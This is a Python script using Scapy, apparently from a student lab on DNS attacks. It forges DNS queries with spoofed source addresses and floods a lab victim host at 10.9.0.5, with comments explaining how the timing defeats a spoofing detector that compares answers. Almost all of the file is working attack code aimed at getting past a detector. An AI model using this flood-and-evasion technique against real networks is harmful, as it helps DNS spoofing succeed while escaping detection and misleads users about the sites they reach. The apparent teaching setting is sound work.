# Shebang line to indicate which interpreter is to be used by specifiying it's path
#!/usr/bin/env python3

#############################################################################
############################ ATTACK STRATEGY V.2 ############################

#############################################################################
############################### ISSAM MISTO #################################

from scapy.all import *

# In this function, we create the IP packet setting both 
# the source and destination to be the victim.
# We do this to avoid the detection algorithm, which checks if a DNS query
# has more than one answer,and then compares both answers to make sure they're 
# correct. However in this case, the query will only get one answer, and will
# then be replaced by a different query which will also get one answer and so on...
def create_IP_Packet(IP_src, IP_dst):

    IPpacket = IP(src = IP_src, dst = IP_dst)
    return IPpacket

# In this function, we create the UDPpacket setting the destination port
# to be 53 which is the local DNS server
def create_UDP_Packet():

    UDPpacket = UDP(dport = 53)
    return UDPpacket

# In this function, we create the DNSpacket with the correct configuration. 
# We set qname to be the requested domain
def create_DNS_Packet(qname):

    DNSpacket = DNS(rd =1 , qdcount = 1, qd = DNSQR( qname = qname , qtype = 255))
    return DNSpacket

# Create the full request
def create_request(IP_src, IP_dst, qname):

    request = create_IP_Packet(IP_src, IP_dst)/create_UDP_Packet()/create_DNS_Packet(qname)
    return request

#############################################################################
############################### ALI HIJJAWI #################################

import time

# The main attack function
def executeAvoidanceAttack():
    
    # Here, the attack is based on a smart avoidance technique to fool the detection algorithm
    # the attacker floods the victim with DNS queries as if requested by the victim themselves,
    # in such a way to have the detection algorithm not be able to compare the spoofed false DNS answer
    # from the attacker and the real DNS answer from the DNS server
    for i in range(800):

        # here, the fake domain should not be the same as that of the main attackv1.py, since if they were, then the attack's machine
        # will sniff these packets as if they are DNS queries sent by the victim

        # BUG UPDATE:
        # this part had the source and destination set as the same, but since the attack sniffs for DNS packets from the victim,
        # then having their IP as source would mean that the attacker will sniff their own packets, and then send false
        # DNS answers to the victim, which is not what we wanted. Thats why we set the source to any random IP
        randomTarget = '9.9.9.9'
        victim = '10.9.0.5'
        fakeDomain = 'www.example.com'

        # we start the flooding of the victim with DNS queries so that the detection awaits an answer.
        # we reply to the main DNS query with the fake domain, and then the algorithm only sees one answer,
        # and then a query so it detects again for different answers, in which the DNS real answer comes back
        # and the detection considers it a valid answer. No same query had two answers.
        # notice in issam's functions, how the source is set as the victim so that the detection sniffs those
        # packets and awaits an answer
        forgedDNSQueryPacket = create_request(randomTarget, victim, fakeDomain)
        send(forgedDNSQueryPacket)

        # after experimentation, we saw that having the split time between packets as 0.1 best, since the DNS
        # server replies with the real answer shortly after we send the fake DNS answer
        time.sleep(0.1)



# removed for better execution: use these for an isolated flood
# target = '10.9.0.5'
# # here, the fake domain should not be the same as of the main attackv1.py, since if they were, then the attack's machine
# # will sniff these packets as if they are DNS queries sent by the victim
# fakeDomain = '1.2.3.4'

# # a filter to sniff packets specifically sent by this host towards port 53 - which is the local DNS server
packetFilter = 'udp and src host 10.9.0.5 and dst port 53'
# # the scapy sniff function; it executes the attack as soon as it sniffs the DNS query packet
sniffedPacket = sniff(iface = 'br-68a034f7b70c', filter = packetFilter, prn = executeAvoidanceAttack())